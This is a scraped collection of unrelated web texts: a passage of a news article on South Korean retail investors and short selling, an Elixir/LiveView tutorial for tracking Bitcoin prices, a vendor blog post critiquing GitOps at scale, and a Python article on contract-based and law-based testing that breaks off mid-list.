<p>Jung is also concerned by what financial experts have <a href="https://biz.chosun.com/site/data/html_dir/2017/03/06/2017030603181.html">cautioned</a> is the tendency of ants to go after risky, short-term bets. “South Korea might have one of the highest literacy rates in the world, but our level of financial literacy is very poor,” said Jung. “Ants do a lot of quick-hit trading — selling when prices rise a little but also when prices drop just slightly.” One popular <a href="https://news.joins.com/article/23875703">rule of thumb</a> for young ants has been “hitting five,” or cashing out whenever you reach a 5% return or make $45 (50,000 won) in profit. Many have also turned to margin trading, essentially borrowing money to buy stocks, which has recently become <a href="https://www.ytn.co.kr/_ln/0102_202101181804220081">more popular</a> than ever. With the Korean stock market <a href="https://www.researchgate.net/publication/228425122_Why_are_Korean_markets_so_volatile">notoriously volatile</a>, investors can easily end up losing more than they put in.</p>



<p>But when the ants work together, they can move markets. Last March, foreign and institutional investors, worried about the impact of the coronavirus pandemic, sold off a combined $46 billion (50 trillion won) of the benchmark KOSPI, pushing the market down to a dismal 1,457.64 points. <a href="http://english.hani.co.kr/arti/english_edition/e_business/977810.html">Ants countered</a>, buying $43.58 billion (47.4 trillion won), propelling the KOSPI index over the 3,000 mark for the first time in history, in January of this year. The feat has been named the <a href="http://www.hani.co.kr/arti/economy/finance/976027.html">Donghak Ant Movement</a>, a tongue-in-cheek reference to the Donghak Peasant Revolution, an 1894 uprising of farmers against corrupt government officials and economic destabilization at the hands of foreign powers.&nbsp;</p>



<figure><blockquote><p>“The problem is that the Korean stock market system is designed to the advantage of certain players. Short selling is emblematic of that.”</p></blockquote></figure>



<p>“The stock market index has historically fallen before rebounding in times of crisis, and it seems like retail investors anticipated this scenario this time,” said Kim So-young, a finance professor at Seoul National University. “Once it became apparent that a lot of them were holding the line, more piled on, causing the surge.”</p>



<p>The ants’ ability to collectively flex their power has given them <a href="https://news.kbs.co.kr/news/view.do?ncd=5090525">undeniable political leverage</a>. In late 2020, the Alliance <a href="https://biz.chosun.com/site/data/html_dir/2020/11/03/2020110302008.html">successfully rallied against a government proposal</a> to expand capital gains taxes on stock investments for the top 5% of retail investors. Since December 2020, over 200,000 people have signed a <a href="https://www1.president.go.kr/petitions/595214">presidential petition</a> calling for the abolition of short selling, meeting the requirement for an official response from the government.&nbsp;</p>



<p>Proponents of short selling argue that it functions as a kind of safety valve for the stock market. By allowing investors to bet in both directions, the practice skims the fat off overvalued stocks and keeps the market efficient. But “the problem is that the Korean stock market system is designed to the advantage of certain players,” said Jung. “Short selling is emblematic of that.”</p>



<p>Short selling comprises only about 4% of total trades in South Korea, compared to around 40% in other major markets, but the point, according to Jung, is the inequality. “The dynamic is always one side disproportionately profiting, while retail investors are losing,” said Jung. “That’s what needs to change.”</p>



<p>Shorting a stock requires first borrowing the shares, which you then later buy back at a lower price to make a profit. Individual investors <a href="https://www.yna.co.kr/view/AKR20210113116200502%2523:~:text=%2525EC%25259E%252590%2525EB%2525B3%2525B8%2525EC%25258B%25259C%2525EC%25259E%2525A5%2525EB%2525B2%252595%252520180%2525EC%2525A1%2525B0%2525EB%25258A%252594,%2525EB%2525B6%252588%2525EB%2525B2%252595%2525EC%25259C%2525BC%2525EB%2525A1%25259C%252520%2525EC%2525B7%2525A8%2525EA%2525B8%252589%2525EB%252590%252598%2525EB%25258A%252594%252520%2525EA%2525B2%252583%2525EC%25259D%2525B4%2525EB%25258B%2525A4.">face high collateral rates and fees</a>, <a href="https://www.msn.com/ko-kr/money/markets/%2525EA%2525B3%2525B5%2525EB%2525A7%2525A4%2525EB%25258F%252584%2525EC%25259D%252598-%2525EC%2525A4%252591%2525EC%25258B%2525AC-%2525EB%2525A6%2525AC%2525ED%252585%25258C%2525EC%25259D%2525BC%2525ED%252592%252580%2525EC%25259D%252598-%2525EB%2525B9%252584%2525EB%2525B0%252580/ar-BB1cDqVv">limited selections</a> of shares, and a repayment period capped at 60 days. Foreign investors and institutions, on the other hand, have no fixed repayment deadline — although lenders can technically recall their shares at any time. Moreover, capital gains from short selling are untaxed. Consequently, <a href="https://www.mk.co.kr/news/economy/view/2019/12/1054426/">just 1%</a> of short sellers in South Korea are small investors.</p>



<p>Retail investors, particularly those trading on margins, are also uniquely vulnerable to market volatility, which short selling can amplify — particularly in small stocks that are already sensitive to large movements. “There is definitely an aspect of short selling that stokes volatility,” said Kim So-young, the finance professor. “For stock that might not fall as dramatically if it weren’t being shorted, a short sell can exacerbate the decline.”</p>



<p>This has heightened the sense among ants that big institutional and foreign investors can use short selling to siphon money from retail traders. A <a href="https://biz.chosun.com/site/data/html_dir/2021/01/17/2021011700419.html">recently published study</a> by researchers at Hanyang University found that short sellers in Korea <a href="https://www.bloomberg.com/news/articles/2021-01-28/short-sellers-under-siege-everywhere-have-it-really-bad-in-korea">averaged about $2 million in daily profits</a> from 2016 to 2019, while investors who traded on margin lost an average of $900,000 per day. “The rule here is that the money flows out from the wallets of individual investors to short sellers,” Jung said. “It’s a staggering gap.”</p>



<p>Although short selling alone is unlikely to cause the index to plummet, some analysts worry that the market is approaching a bubble and that <a href="https://www.yna.co.kr/view/AKR20210203165200004">overleveraged new ants</a> could soon find themselves in trouble.</p>



<p>Jung said that authorities should use this moment to put in place protections and education for retail investors so that they can better handle volatility. He is also studying the fallout from the r/WallStreetBets incident. Many retail investors lost out as GameStop shares slumped again after the rush was over.</p>

                        <p><span>31-01-2021</span></p><h2>Using LiveView and GenServers to track BTC price</h2>

                        <p>My assumption was that price of Bitcoin varies from one cryptocurrecy exchange to another and that I could earn just by buying and selling BTC on different platforms. In order to check that I could just get prices from last few days from few exchanges and use Excel to do the comparison or I could use this idea to improve my knowledge on <a href="https://hexdocs.pm/phoenix_live_view/Phoenix.LiveView.html">LiveView</a> and <a href="https://hexdocs.pm/elixir/GenServer.html">GenServer</a>. As you have already guessed I picked latter option.</p>

                        <p><img src="https://cmdarek.com/images/ebisu.svg"></p>

                        <p>Our solution consist of two application: ebisu and ebisu_web. First one is responsible for periodically check BTC price in exchanges, saving this data in db and notifying ebisu_web about new pices. Ebisu_web is simple web application that shows BTC price from few exchanges in real time. To not add unnecessary complexity I'm going to describe solution only for <a href="https://bitbay.net/">BitBay exchange</a>.</p><p><img src="https://cmdarek.com/images/ebisu.gif"></p>

                        <h3>Main components</h3>
                        <p>To fetch data from exchanges we use <a href="https://github.com/edgurgel/httpoison">HTTPoison</a> which is simple yet powerfull HTTP client. Ebisu.Utils.Http is wrapper around this library. It is done that way to reuse it in multiple places and to mock it in tests. This component should be moved to separate application where we could test it with real api and in tests for ebisu app we should use mocks.</p>                       
                        <pre>                        <code>
defmodule Ebisu.Utils.Http do
  @timeout 5000
  @callback get(String.t()) :: term() | no_return() | {:error, term()}

  def get(url) do
    case HTTPoison.get(url, [{"content-type", "application/json"}], recv_timeout: @timeout) do
      {:ok, %HTTPoison.Response{body: body, status_code: 200}} -&gt;
        Jason.decode!(body)

      {:ok, %HTTPoison.Response{body: body}} -&gt;
        {:error, body}

      {:error, %HTTPoison.Error{reason: reason}} -&gt;
        {:error, reason}
    end
  end

  def new do
    Application.get_env(:ebisu, :http_client)
  end
end
                        </code>
                        </pre>
                        <p>To simplify code we have yet another layer of abstraction for http client. For each exchange we have specific http client. In <a href="https://bitbay.net/">BitBay</a> example we are going to fetch BTC price in PLN which we then convert to USD.</p>
                        <pre>                        <code>
defmodule Ebisu.Bitbay.Clients.Http do
  alias Ebisu.Utils.Http

  def get_ticker do
    Http.new().get("https://bitbay.net/API/Public/BTCPLN/ticker.json")
  end

  def get_rate do
    rate = Http.new().get("http://api.nbp.pl/api/exchangerates/rates/a/usd/?format=json")

    rate
    |&gt; Map.get("rates")
    |&gt; Enum.at(0)
    |&gt; Map.get("mid")
  end
end
                        </code> 
                        </pre>

                        <p>In heart of our application is exchange module which main responsibility is to get last price of BTC, converte it to USD and save it to db. Data is going to be stored in PostgreSQL using Ecto. For this to work we also have to define schema and migration.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href=""><p>I’m looking at hundreds of DevOps setups a year. Lately, everybody is talking about GitOps. I noticed that some teams were increasingly frustrated with this approach, while others were immensely positive. But google “GitOps”. Everyone is positive. I started to wonder why.<br></p><p>It became clear to me that teams had a positive initial experience with the approach. Yet, frustration grew down the line. And down the line means, it grew with the:<br></p><ol role="list"><li>Time teams used the GitOps approach&nbsp;</li><li>Number of apps or services teams introduce to GitOps<br></li></ol><p>I started to realize that if I mapped several cases on a coordinate system with two axes (satisfaction level with Gitops and # of YAML files) they would approximate a descending graph. One could map the GitOps’ satisfaction rate&nbsp; as a function of the number of YAML files.</p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7d464ef0c38006b1c92b_satisfaction-of-gitops-vs-number-of-yaml-files.png" loading="lazy" alt=""></p></figure><h2>Can we explain this function theoretically?<br></h2><p>What are the reasons for this behaviour change? Why does the number of YAML files have an impact on the satisfaction level with the GitOps approach? To explain this, I came up with the following thought-experiment.<br></p><p>You’re tasked with building a factory lane. The inputs are pre-processed pieces of steel. You need to build an assembly line that takes those pieces and presses them to different screws. Those screws will go into extremely sensible medical equipment. If this equipment fails, this has severe implications. You need to have end-to-end auditability of what screw came from what piece of steel.</p><p><span id="hs-cta-wrapper-84799b9f-56cb-4884-bee8-6bd0d067207e"><span id="hs-cta-84799b9f-56cb-4884-bee8-6bd0d067207e"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/5890440/84799b9f-56cb-4884-bee8-6bd0d067207e"><img id="hs-cta-img-84799b9f-56cb-4884-bee8-6bd0d067207e" height="628" width="1200" src="https://no-cache.hubspot.com/cta/default/5890440/84799b9f-56cb-4884-bee8-6bd0d067207e.png" alt="Webinar: GitOps from the Trenches"></a></span></span></p><p>‍<br>So far, so good. Not a simple exercise but doable if you can control the input, right? If you get the exact same piece of metal in the exact same quality every time, it’s straightforward to ensure that the output is consistent.<br></p><p>Let’s assume the assembly line is perfect and is never the cause of failure. This assumption leaves the input as the only reason a screw can fail. Let’s say we only have one screw. This case can be characterized with the following graphic:</p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7d784ef0c349adb1e5b5_screw-from-1-supplier.png" loading="lazy" alt=""></p></figure><p>If the probability that the steel delivered by &lt;it&gt;supplier 1&lt;it&gt; works by 90%, the system’s (the medical equipment) overall probability to function as expected equals the probability of &lt;it&gt;screw 1&lt;it&gt; to work. This takes us to the following likelihood to fail:<br></p><blockquote>P(system fails) = 1- P(steel supplier 1 fails)<br></blockquote><p><strong>Solution:</strong> In the single supplier example, the failure probability equals 10%.<br></p><p>Unfortunately, life is more complicated. You now have three steel suppliers. Again, for sake of simplicity, we assume that steel from each supplier is used for exactly one screw in the machine. And our machine now consists of three screws that can each fail. In a graphical representation, it looks something like this:</p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7d9aec665260b33367f8_screws-from-supplier-1-2-3.png" loading="lazy" alt=""></p></figure><p>To keep the formula easy, we will assume the steel from all three suppliers works with the exact same probability of 90%.<br></p><blockquote>P1=0.9, P2=0.9, and P3=0.9<br></blockquote><p>The combined probability of the medical equipment to function as expected can be calculated by multiplying all probabilities.<br></p><p>We can simplify:</p><blockquote>P(system works) = P1*P2*P3 to P(system works)=P^n<br></blockquote><p>Which means the likelihood of the system not to work equals:<br></p><blockquote>P(system fails)=1-p^n<br></blockquote><p><strong>Solution</strong>: Putting in the actual numbers this leaves us with 27.1% likelihood that this system fails at some point.<br></p><blockquote>P(system fails) = 1-0.9^3 = 0.271 or 27,1%<br></blockquote><p>Reality is even more screwed (haha). You will have several screws made from steel from different suppliers. We will refrain from complicating this further. You get the idea now.<br></p><p>&lt;it&gt;What does this tell us?&lt;it&gt; With an increasing number of suppliers (with their own unique likelihood of supplying failing pieces), your overall probability of failure rises. Remember, the likelihood of failure with a single supplier and screw was 10%. Where with three suppliers of three screws, the likelihood of failure equals 27.1%.<br></p><p>It also tells us that if you start simple, you can go for quite some time without experiencing any failures; You can actually statistically calculate how long you can go on before you experience the first failure.<br></p><p>In general, with a growing number of processes, failure will hit. Once failure hits, it also gets increasingly hard to ensure your audit trail. You’ll soon find yourself trying to understand what piece of steel - by which supplier - was used to produce the specific screw that then failed.<br></p><h2>So what?<br></h2><p>Why am I telling you this nonsense about screws, you ask?<br></p><p>Because it’s a good way to understand the fundamental problem with GitOps. The problem is not the toolchain (although mostly immature at the moment), but in particular, the nature of its input. Let’s translate the above example into our software world!<br></p><ul role="list"><li>Your assembly line is your GitOps toolchain and workflow.&nbsp;</li><li>Your suppliers are individual developers.&nbsp;</li><li>Steel is now a set of configuration files written in YAML</li><li>Your screws are microservices.</li><li>The machine you’re building is an application.<br></li></ul><p>If we have one service from one supplier, the world looks like this:</p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7dc23cb13acb7b1e9b65_microservice-from-one-developer.png" loading="lazy" alt=""></p></figure><p>Now, let’s add microservices from different developers:</p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7de3741d50926b298565_microservices-developer-1-2-3-yamls.png" loading="lazy" alt=""></p></figure><p>Your likelihood of failure rises with the same formula. It depends on the number of YAML files from individual developers that configure an individual microservice and the number of suppliers.<br></p><p>You will likely go without any trouble for some time and YAML volume. But the time will come where it will fail. And when it fails, GitOps becomes a nightmare to audit where the system failed: Finding what introduced the problem and why becomes a real challenge.<br></p><p>Using a version control system to browse and try to trace an error in <a href="https://humanitec.com/blog/tame-your-zoo-of-scripts">unstructured scripts</a> is a horrible endeavor (and gets more horrible with the total number of YAML files rising.)<br></p><p>Let’s change our original screws graphic. Also, we can swap the Y-axis with the probability of <strong>not</strong> experiencing failure of the system:<br></p><figure><p><img src="https://assets.website-files.com/5c73bbfe3312822f153dd310/602f7df94572daa055338527_probability-of-working-system-vs-number-of-yaml-files.png" loading="lazy" alt=""></p></figure><p>This matches well with how the Director of Platform of a huge global delivery company has recently described his experience with the GitOps approach:<br></p><blockquote>“GitOps is like magic if it works, and like magic if it doesn’t.”<br></blockquote><p>In short, as you do not control the quality and consistency of the input, and the system is hard to audit, throwing an assembly line (or automation framework) on top is a terrible idea. It will not fail immediately, but it will eventually. If it does, it’s bad. Things get worse with time and the number of services in the system.</p><h2>So what to do now?</h2><p>You have exactly one way of solving this problem: You focus on the input.<br></p><p>Your problem lies with the unstructured nature of the “YAML” format. If you can solve this, you can use the GitOps approach (or anything else), and it will work. But if you decide not to eradicate the root cause, you’ll run into GitOps’ scalability and auditability problems.<br></p><p>Ádám Sándor from Container Solutions actually wrote a <a href="https://blog.container-solutions.com/gitops-limitations">great piece</a> on this. So how do you fix the input? How is configuration as code possible (with all its advantages), while load balancing the down-sides (the unstructured format and the lack of control.)?<br></p><p>The key is to remove or minimize the human error when creating those YAML files, which is the main cause of an increased probability of failure. The fewer “suppliers” you have, the less likelihood of failure you’ll have.<br></p><p>So how do you actually do that? You cannot erase it entirely, because it’s unlikely to believe that a.) a single set of manifests can rule them all and b.) the Ops team can write all manifests themselves. The solution is to work with “baseline configurations'' and let developers apply changes to those baseline configurations in a standardized way. Developers can create different baseline configuration profiles.<br></p><p>In those profiles, they set specific standards such as “the default CPU allocation on a workload always equals 0.25.”&nbsp; Developers can make changes against these default templates via a centralized UI or CLI. At deployment time, a tool (an <a href="https://humanitec.com/blog/what-is-an-internal-developer-platform">Internal Developer Platform</a>, for instance) can apply the changes to the baseline configurations and create the manifests.<br></p><p>As you can see, we are now “creating” new manifests from a set of clearly auditable rules for every single deployment. This is an immutable record of the state of application configurations at deployment time. Whether you use GitOps to then execute those configurations or any other method doesn’t really matter. As we are now tightly controlling the input, the assembly line isn’t as important.<br></p><p>This strategy provides the Ops team with more control over the YAML files and prevents any “surprise” changes by developers while still giving them the needed freedom to configure their applications.<br></p><p>In other words, developers aren’t restricted as they can still apply all changes if necessary while you eradicate input variability. But the nature of creating one set of new manifests per deployment makes it traceable, auditable, and simple to roll back to the previous version.<br></p><h2>Do you have a different experience?&nbsp;</h2><p>Look at our little formula. If you are a small team, or you work with a limited amount of services, your likelihood of regularly hitting problems is low, maybe very low.</p><p><span id="hs-cta-wrapper-84799b9f-56cb-4884-bee8-6bd0d067207e"><span id="hs-cta-84799b9f-56cb-4884-bee8-6bd0d067207e"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/5890440/84799b9f-56cb-4884-bee8-6bd0d067207e"><img id="hs-cta-img-84799b9f-56cb-4884-bee8-6bd0d067207e" height="628" width="1200" src="https://no-cache.hubspot.com/cta/default/5890440/84799b9f-56cb-4884-bee8-6bd0d067207e.png" alt="Webinar: GitOps from the Trenches"></a></span></span></p><p>If this makes it feasible for you, I’m not saying you should change anything. But if you are running 5+ apps with 10+ services, each in production, you should seriously consider whether getting into GitOps is a good idea.<br></p><p>&lt;it&gt;From my experience: it isn’t.&lt;it&gt;<br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p><img src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/c4y2pgr3ddjtu33svrm2.png" alt="Cover image"></p>

<p>Today I am going to discuss quite a new idea for Python users, an idea of making tests a valuable part of your application.</p>

<p>Let’s jump into it.</p>


      <h2 id="current-status">
        
        <a href="#current-status">Current status</a>
        
      </h2>

<p>Right now the status-quo for source code/tests dualism is that you ship source code to your library users and most often do not include your tests in any manner.</p>

<p>Sometimes people also attach the <code>tests/</code> folder to a release, so they are just laying around just in case. Most of the time they are useless to the end-user.</p>

<p>And what is the most important part of it all is that our users are often find themselves in a situation when they have to reimplement some tests for library-specific things.</p>

<p>Let me give you an example: you have a Django view for authorized users only.</p>

<div><div><pre><code><span>from</span> <span>django.contrib.auth.decorators</span> <span>import</span> <span>login_required</span>
<span>from</span> <span>django.http</span> <span>import</span> <span>HttpRequest</span><span>,</span> <span>HttpResponse</span>

<span>@</span><span>login_required</span>
<span>def</span> <span>my_view</span><span>(</span><span>request</span><span>:</span> <span>HttpRequest</span><span>)</span> <span>-&gt;</span> <span>HttpRespose</span><span>:</span>
    <span>...</span>
</code></pre></div></div>

<p>So, in our tests we would have to write at least two tests:</p>
<ol>
  <li>For the successful auth case and our business logic</li>
  <li>For the failed auth case</li>
</ol>

<p>Wouldn’t it be amazing if we could just skip the second one and rely on some existing test-logic that we can re-use from the library itself?</p>

<p>Imagine an API like:</p>

<div><div><pre><code><span># tests/test_views/test_my_view.py
</span><span>from</span> <span>myapp.views</span> <span>import</span> <span>my_view</span>

<span>def</span> <span>test_authed_successfully</span><span>(</span><span>user</span><span>):</span>
    <span>"""Test case for our own logic."""</span>

<span># Not authed case:
</span><span>my_view</span><span>.</span><span>test_not_authed</span><span>()</span>
</code></pre></div></div>

<p>And then - boom - we have our second use-case tested with just a single line of code!</p>

<p>And it goes further than this. For example, in Django you can stack function <a href="https://docs.djangoproject.com/en/3.1/topics/http/decorators/">decorators</a> to do multiple things. Imagine this situation:</p>

<div><div><pre><code><span>from</span> <span>django.views.decorators.cache</span> <span>import</span> <span>never_cache</span>
<span>from</span> <span>django.contrib.auth.decorators</span> <span>import</span> <span>login_required</span>
<span>from</span> <span>django.views.decorators.http</span> <span>import</span> <span>require_http_methods</span>

<span>@</span><span>require_http_methods</span><span>([</span><span>'GET'</span><span>,</span> <span>'POST'</span><span>])</span>
<span>@</span><span>login_required</span>
<span>@</span><span>never_cache</span>
<span>def</span> <span>my_view</span><span>(</span><span>request</span><span>:</span> <span>HttpRequest</span><span>)</span> <span>-&gt;</span> <span>HttpRespose</span><span>:</span>
    <span>...</span>
</code></pre></div></div>

<p>So, the API might be a little more magical to include a test for all the possible cases:</p>

<div><div><pre><code><span># tests/test_views/test_my_view.py
</span><span>from</span> <span>myapp.views</span> <span>import</span> <span>my_view</span>

<span>my_view</span><span>.</span><span>run_tests</span><span>()</span>
</code></pre></div></div>

<p>And it can potentially execute:</p>
<ol>
  <li>Tests for http methods that are not allowed</li>
  <li>Tests for http methods that are allowed</li>
  <li>Test that <code>Cache-Control</code> header is there and has a correct value</li>
  <li>Test that unauthorized users are not allowed</li>
  <li>And possibly others!</li>
</ol>

<p>All you have to do is testing your green path with a possibility to customize some particular generated test cases if you have some specifics, like returning a custom http code for unauthorized users.</p>

<p>The bad part of this chapter is that the discussed API does not exist. And probably won’t ever exist in Django.</p>

<p>But, there are other less-known projects (but ones that I help to maintain) that already have these features. Let’s see what you can do with them!</p>


    
      <h2 id="deal">
        
        <a href="#deal">deal</a>
        
      </h2>

<p><a href="https://github.com/life4/deal"><code>deal</code></a> is a library for <a href="https://en.wikipedia.org/wiki/Design_by_contract">Design-by-Contract</a>.</p>

<p>In other words, it allows decorating your functions and classes with some extra checks that are not representable by types (at least in Python-land).</p>

<p>Let’s say you have a function to divide two positive integers (which are just <code>int</code> in Python):</p>

<div><div><pre><code><span>import</span> <span>deal</span>

<span>@</span><span>deal</span><span>.</span><span>pre</span><span>(</span><span>lambda</span> <span>a</span><span>,</span> <span>b</span><span>:</span> <span>a</span> <span>&gt;=</span> <span>0</span> <span>and</span> <span>b</span> <span>&gt;=</span> <span>0</span><span>)</span>
<span>@</span><span>deal</span><span>.</span><span>raises</span><span>(</span><span>ZeroDivisionError</span><span>)</span>  <span># this function can raise if `b=0`, it is ok
</span><span>def</span> <span>div</span><span>(</span><span>a</span><span>:</span> <span>int</span><span>,</span> <span>b</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>float</span><span>:</span>
    <span>return</span> <span>a</span> <span>/</span> <span>b</span>
</code></pre></div></div>

<p>It has all the contract information in the function’s definition:</p>
<ul>
  <li><code>@deal.pre(lambda a, b: a &gt;= 0 and b &gt;= 0)</code> checks that passed arguments are positive</li>
  <li><code>@deal.raises(ZeroDivisionError)</code> allows this function to explicitly raise <code>ZeroDivisionError</code> without breaking the contract, by default functions cannot raise any exceptions</li>
</ul>

<p>Note: type annotations like in <code>(a: int, b: int) -&gt; float</code> are not enforced, you should use <code>mypy</code> to catch typing errors.</p>

<p>Usage (remember, it is still just a function!):</p>

<div><div><pre><code><span>div</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span>  <span># ok
</span><span>div</span><span>(</span><span>1</span><span>,</span> <span>0</span><span>)</span>  <span># ok, runtime ZeroDivisionError
</span>
<span>div</span><span>(</span><span>-</span><span>1</span><span>,</span> <span>1</span><span>)</span>  <span># not ok
# deal.PreContractError: expected a &gt;= 0 and b &gt;= 0 (where a=-1, b=1)
</span></code></pre></div></div>

<p>Ok, the simple use-case is clear. Now, let’s put a bug in this function on purpose:</p>

<div><div><pre><code><span>import</span> <span>deal</span>

<span>@</span><span>deal</span><span>.</span><span>pre</span><span>(</span><span>lambda</span> <span>a</span><span>,</span> <span>b</span><span>:</span> <span>a</span> <span>&gt;=</span> <span>0</span> <span>and</span> <span>b</span> <span>&gt;=</span> <span>0</span><span>)</span>
<span>@</span><span>deal</span><span>.</span><span>raises</span><span>(</span><span>ZeroDivisionError</span><span>)</span>  <span># this function can raise if `b=0`, it is ok
</span><span>def</span> <span>div</span><span>(</span><span>a</span><span>:</span> <span>int</span><span>,</span> <span>b</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>float</span><span>:</span>
    <span>if</span> <span>a</span> <span>&gt;</span> <span>50</span><span>:</span>  <span># Custom, in real life this would be a bug in our logic:
</span>        <span>raise</span> <span>Exception</span><span>(</span><span>'Oh no! Bug happened!'</span><span>)</span>
    <span>return</span> <span>a</span> <span>/</span> <span>b</span>
</code></pre></div></div>

<p>Luckily, <code>deal</code> follows the core idea of this article and ships tests with itself. To run them all we need to do is write just a single test case:</p>

<div><div><pre><code><span>import</span> <span>deal</span>

<span>from</span> <span>my_lib</span> <span>import</span> <span>div</span>

<span>@</span><span>deal</span><span>.</span><span>cases</span><span>(</span><span>div</span><span>)</span>  <span># That's all we have to do to test deal-based functions!
</span><span>def</span> <span>test_div</span><span>(</span><span>case</span><span>:</span> <span>deal</span><span>.</span><span>TestCase</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
    <span>case</span><span>()</span>
</code></pre></div></div>

<p>Here’s what the output would be like:</p>

<div><div><pre><code>» pytest test_deal.py

    @deal.pre(lambda a, b: a &gt;= 0 and b &gt;= 0)
    def div(a: int, b: int) -&gt; float:
        if a &gt; 50:
&gt;           raise Exception('Oh no! Bug happened!')
E           Exception: Oh no! Bug happened!

test_deal.py:8: Exception
============================== 1 failed in 0.35s ===============================
</code></pre></div></div>

<p>As you can see our tests did find the bug! But how?</p>

<p>There are a lot of questions to ask:</p>

<ul>
  <li>
    <p>Where did the data for the test come from?
It comes from another awesome library called <a href="https://github.com/HypothesisWorks/hypothesis"><code>hypothesis</code></a>. It smartly generates lots of different test data according to some specific rules we define.</p>

    <p>In our case, we have two rules. First rule generate two <code>int</code> arguments as defined in <code>def div(a: int, b: int)</code>. The second rule is that these integers must be <code>&gt;= 0</code> as defined in <code>@deal.pre(lambda a, b: a &gt;= 0 and b &gt;= 0)</code>.</p>

    <p>We can control how many examples would be generated and do other small tweaks.
More about it is in the <a href="https://deal.readthedocs.io/basic/tests.html">docs</a>.</p>
  </li>
  <li>
    <p>Why <code>ZeroDivisionError</code> didn’t break the test while raw <code>Exception</code> did?
Because that’s how contracts work: you clearly define all possible cases. If something strange happens - the contract is violated. In our example, <code>ZeroDivisionError</code> is a part of the contract via <code>deal.raises</code> decorator. So, we know that it can (and will) happen. That’s why we don’t treat it as a test failure, while raw <code>Exception</code> is not a part of our contract and we treat it as a failure.</p>
  </li>
  <li>
    <p>Will it find all bugs in my code?
That’s the most interesting question. And the answer is <strong>no</strong>. Sad, but true.
There are endless use-cases, logic, combitations, and bugs in them. And I know for sure that it is impossible to catch all bugs your app has.</p>

    <p>But, in reality, it will catch <strong>a lot</strong> of bugs. In my opinion, it is still worth it.</p>
  </li>
</ul>

<p>We can even go one step further and represent our contracts as <a href="https://github.com/Z3Prover/z3">Theorems to be proved</a>.
For example, <code>deal</code> has an ongoing research companion project - <a href="https://github.com/orsinium-labs/deal-solver"><code>deal-solver</code></a> - that can help with that. But, this is a subject for another article of its own, so let’s move on for now.</p>


    
      <h2 id="dry-pythonreturns">
        
        <a href="#dry-pythonreturns">dry-python/returns</a>
        
      </h2>

<p><a href="https://github.com/dry-python/returns"><code>dry-python/returns</code></a> is a library with primitives that make typed functional programming in Python easier.</p>

<p>Inside we have a bunch of interfaces that our users can extend for their own primitives/objects. In the recent article about <a href="https://sobolevn.me/2020/10/higher-kinded-types-in-python">Higher Kinded Types</a> I have shown how this can be done in a type-safe way.</p>

<p>Now, I am going to show that it is not enough on its own. And most likely you will need some extra laws on how your objects should behave.</p>

<p>We call this feature “Monad laws as values”.</p>


    
      <h3 id="identity-laws">
        
        <a href="#identity-laws">Identity laws</a>
        
      </h3>

<p>Let’s start from the easiest Higher Kinded Interface we have: <a href="https://github.com/dry-python/returns/blob/master/returns/interfaces/equable.py"><code>Equable</code></a>. It is an interface that allows type-safe equality checks. Because you can use <code>==</code> for everything in Python. But, our <code>.equals()</code> method will allow us to only check the object of the same type which has real values inside.</p>

<p>For example:</p>

<div><div><pre><code><span>from</span> <span>returns.io</span> <span>import</span> <span>IO</span>

<span>IO</span><span>(</span><span>1</span><span>)</span> <span>==</span> <span>1</span>  <span># type-checks, but pointless, always false
</span>
<span>IO</span><span>(</span><span>1</span><span>).</span><span>equals</span><span>(</span><span>1</span><span>)</span>  <span># does not type-check at all
# error: Argument 1 has incompatible type "int";
# expected "KindN[IO[Any], Any, Any, Any]"
</span>
<span>other</span><span>:</span> <span>IO</span><span>[</span><span>int</span><span>]</span>
<span>IO</span><span>(</span><span>1</span><span>).</span><span>equals</span><span>(</span><span>other</span><span>)</span>  <span># ok, might be true or false
</span></code></pre></div></div>

<p>Here’s how it looks like at the moment:</p>

<div><div><pre><code><span>_EqualType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_EqualType'</span><span>,</span> <span>bound</span><span>=</span><span>'Equable'</span><span>)</span>

<span>class</span> <span>Equable</span><span>(</span><span>object</span><span>):</span>
    <span>@</span><span>abstractmethod</span>
    <span>def</span> <span>equals</span><span>(</span><span>self</span><span>:</span> <span>_EqualType</span><span>,</span> <span>other</span><span>:</span> <span>_EqualType</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
        <span>"""Type-safe equality check for values of the same type."""</span>
</code></pre></div></div>

<p>Let’s say we want to create a bad implementation for this interface (because of science):</p>

<div><div><pre><code><span>from</span> <span>returns.interfaces.equable</span> <span>import</span> <span>Equable</span>

<span>class</span> <span>Example</span><span>(</span><span>Equable</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>inner_value</span><span>:</span> <span>int</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
        <span>self</span><span>.</span><span>_inner_value</span> <span>=</span> <span>inner_value</span>

    <span>def</span> <span>equals</span><span>(</span><span>self</span><span>,</span> <span>other</span><span>:</span> <span>'Example'</span><span>)</span> <span>-&gt;</span> <span>bool</span><span>:</span>
        <span>return</span> <span>False</span>  <span># it breaks how `.equals` is supposed to be used!
</span></code></pre></div></div>

<p>It is clearly wrong because it always returns <code>False</code> without actually checking the <code>inner_value</code> of an object. But, it still satisfies the interface definition: it will type-check. That’s how we can tell that just the interface is not enough. We need to test the implementation as well.</p>

<p>But, equality has known laws from math to catch cases like this:</p>
<ul>
  <li>Reflexive law: a value must be equal to itself</li>
  <li>Symmetry law: <code>a.equals(b) == b.equals(a)</code></li>
